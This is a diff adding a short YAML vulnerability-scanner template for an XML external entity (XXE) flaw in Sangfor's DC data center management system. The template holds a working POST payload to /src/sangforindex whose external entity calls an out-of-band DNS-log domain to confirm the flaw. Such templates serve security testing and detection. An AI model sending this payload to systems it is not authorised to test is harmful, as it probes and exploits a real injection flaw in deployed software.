@@ -1,0 +1,20 @@
+id: poc-yaml-sangfor-DC-data-center-management-system-sangforindex-xxe
+info:
+  name: 深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: DC数据中心管理系统
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /src/sangforindex
+  headers:
+    content-type: text/xml
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<!DOCTYPE root [\n    <!ENTITY\
+    \ rootas SYSTEM \"http://{{.reverseDomain}}\">\n]>\n<xxx>&rootas;</xxx>\n"
+  expression: status_code == 404 && reverse.Verify()
+transport: http
